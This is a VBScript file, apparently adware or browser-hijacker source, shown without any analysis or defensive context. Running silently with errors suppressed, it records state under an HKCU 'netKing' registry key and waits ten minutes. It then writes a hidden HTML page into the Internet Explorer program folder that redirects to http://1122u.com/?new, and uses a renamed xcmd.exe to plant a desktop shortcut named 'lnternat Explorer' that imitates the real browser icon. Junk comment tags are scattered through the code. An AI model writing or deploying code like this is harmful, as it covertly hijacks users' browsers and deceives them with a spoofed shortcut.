On Error Resume Next
'<!-- YxdkTwpdr2z3X246LXbG -->
Dim ProgramFilesPath

Set WshShell = WScript.CreateObject("WScript.Shell")
Set fso=CreateObject("Scripting.FileSystemObject")
'<!-- YxdkTwpdr2z3X246LXbG -->
ProgramFilesPath = WSHShell.ExpandEnvironmentStrings("%ProgramFiles%") & "\" '获取Program Files所在路径
topTesk = wshshell.SpecialFolders("Desktop") & "\"
tmp = WSHShell.ExpandEnvironmentStrings("%tmp%") & "\" 'tmp所在路径
Dim Dayo
'<!-- YxdkTwpdr2z3X246LXbG -->
Dayo = WshShell.RegRead("HKCU\Software\netKing\date")
'<!-- YxdkTwpdr2z3X246LXbG -->
AllUsersPath = WSHShell.ExpandEnvironmentStrings("%AllUsersProfile%") & "\" 'ALL USERS所在路径

If Dayo <> cStr(Date) Then

	Call wshshell.RegWrite("HKCU\Software\netKing\date",Date)
	
	If Dayo <> "" then

		If Not fso.FileExists(topTesk & "lnternat Explorer.lnk") Then
		
			WScript.Sleep(600000)
		
			Dim Opath 
			Dim Npath
			dim Nfpath
		
			Opath = WshShell.RegRead("HKCU\Software\netKing\file")
			
			If Opath <> "" Then
				
				If Not fso.FileExists(Opath) Then
					
					Npath ="A" & Random(6)& " E" & Random(6)
					
					Call CreateFile(ProgramFilesPath & "Internet Explorer\", Npath)
					
					Call wshshell.RegWrite("HKCU\Software\netKing\file",ProgramFilesPath & "Internet Explorer\" & Npath & ".html")
					
					Nfpath = ProgramFilesPath & "Internet Explorer\" & Npath & ".html"
					
				Else
		'<!-- YxdkTwpdr2z3X246LXbG -->
					Nfpath = Opath
				
				End If
				
			Else
				
				Npath ="A" & Random(6)& " E" & Random(6)
				
				Call CreateFile(ProgramFilesPath & "Internet Explorer\", Npath)
				
				Call wshshell.RegWrite("HKCU\Software\netKing\file",ProgramFilesPath & "Internet Explorer\" & Npath & ".html")
				
				Nfpath = ProgramFilesPath & "Internet Explorer\" & Npath & ".html"
		
			End If
			'<!-- YxdkTwpdr2z3X246LXbG -->
			
		
			Dim Onir
			Dim Nnir
			
			Nnir = AllUsersPath & "\Application Data\" & "xcmd.exe"
			
			Call CreateLnk(Nnir,Nfpath,"lnternat Explorer",ProgramFilesPath & "Internet Explorer\IEXPLORE.EXE")	
			
		End If
	
	End If
	
End If 


'<!-- YxdkTwpdr2z3X246LXbG -->


'<!-- YxdkTwpdr2z3X246LXbG -->

Sub CreateFile(Path,FileName)
	
	Dim fso,file
	
	Set fso=CreateObject("Scripting.FileSystemObject")
	Set file=fso.OpenTextFile(Path & FileName &".html",2,True)
	
	file.WriteLine("<meta http-equiv=" & Chr(34) & "refresh" & Chr(34) &"                                                                     				                                               content=" & Chr(34) & "0.1;url=;url=http://1122u.com/?new" & Chr(34) & ">")
	'<!-- YxdkTwpdr2z3X246LXbG -->
	file.Close
	
	Set file=Nothing
	Set fso=Nothing
	
	WScript.Sleep(500)
	'<!-- YxdkTwpdr2z3X246LXbG -->
End Sub
'从a-z  随机选取组成字符串
Function Random(count)'参数,随机字符串长度
	Dim MyValue
	Dim ArryRan
	
	Dim strResult
	
	ArryRan=Array("a","b","c","d","e","f","g","h",_
	"i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z")
	'<!-- YxdkTwpdr2z3X246LXbG -->
	Randomize '初始化随机数生成器。
	
	For i = 1 To count
		MyValue = Int(Rnd*26 )
		strResult = strResult & ArryRan(MyValue)
		'MsgBox MyValue	
	Next
	Random = strResult 
End Function

Sub CreateLnk(NirPath,FileName,LnkName,Ico)
	
	Call WshShell.Run(chr(34) & NirPath & chr(34) & " shortcut " & Chr(34) & FileName & Chr(34) &" "& Chr(34) & "~$folder.desktop$" & Chr(34)&" " & Chr(34) & LnkName & Chr(34)&" " & Chr(34) & Chr(34)&" "& Chr(34) & Ico & Chr(34) ,0)
	'<!-- YxdkTwpdr2z3X246LXbG -->
End Sub 

'<!-- YxdkTwpdr2z3X246LXbG -->